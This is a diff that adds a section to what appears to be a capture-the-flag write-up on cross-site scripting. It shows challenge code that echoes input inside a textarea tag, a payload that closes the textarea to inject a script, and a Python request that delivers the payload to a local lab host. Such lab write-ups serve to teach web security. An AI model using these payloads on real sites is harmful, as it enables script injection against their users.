@@ -737,4 +737,59 @@ print(response.text)
 
 ## level 9
 
->
+> Exploit a cross site scripting vulnerability with more complicated context
+
+```py title="level 9 source code"
+def level9():
+    if request.path == "/echo":
+        echo = request.args.get("echo")
+        assert echo, "Missing `echo` argument"
+        return html(f"<textarea>{echo}</textarea>")
+
+    if request.path == "/visit":
+        url = request.args.get("url")
+        assert url, "Missing `url` argument"
+
+        url_arg_parsed = urllib.parse.urlparse(url)
+        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"
+
+        with run_browser() as browser:
+            browser.get(url)
+            try:
+                WebDriverWait(browser, 1).until(EC.alert_is_present())
+            except TimeoutException:
+                return "Failed to alert\n"
+            else:
+                return f"{flag}\n"
+
+    return "Not Found\n", 404
+```
+
+This level inserts our input within the `<textarea>` tag.
+
+```
+return html(f"<textarea>{echo}</textarea>")
+```
+
+### Cross-Site Scripting (XSS)
+
+If we provide the script it will not be executed because it is wihin the `<textarea>` tag.
+
+```
+<textarea><script>alert(1)</script></textarea>
+```
+
+#### Escaping outer tag (`<textarea>`)
+
+We can escape the outer `<textarea>` tag by closing out the opening tag before providing our script.
+
+```
+<textarea></textarea><script>alert(1)</script></textarea>
+```
+
+```py
+import requests
+
+response = requests.get("http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=</textarea><script>alert(1)</script>")
+print(response.text)
+```
